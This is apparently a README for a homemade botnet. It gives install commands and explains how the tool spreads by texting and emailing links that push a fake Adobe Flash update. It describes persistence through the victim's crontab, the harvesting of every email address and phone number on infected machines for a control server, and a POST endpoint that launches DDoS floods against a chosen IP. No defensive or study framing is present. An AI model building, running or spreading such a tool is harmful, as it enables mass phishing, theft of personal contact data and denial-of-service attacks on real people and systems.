# Installation

	pip install Flask
	pip install python-crontab
	python host_client.py

# Infection

Host is a flask server that accepts incomming request. New email/phone numbers are sent links to the malicious website and prompted to install an Adobe Flash update. The client adds itself to the user's crontab and runs every hour. All emails and phone numbers found on the machine are sent to the host.

# Preform DDOS

Send a POST request to <hostip>:5000/ddos with the victim's ip and count of attacks. All clients who contact to the host after this POST request will send a GET request to the ip every second <count> number of times. Send a new request to <hostip>:5000/ddos with ip = '' to end the ddos attack. This does not stop client's who are in the middle of their attack.

# Encryption

# Communication

Twilio is used to send text messages to victims. STMP is used to send emails.
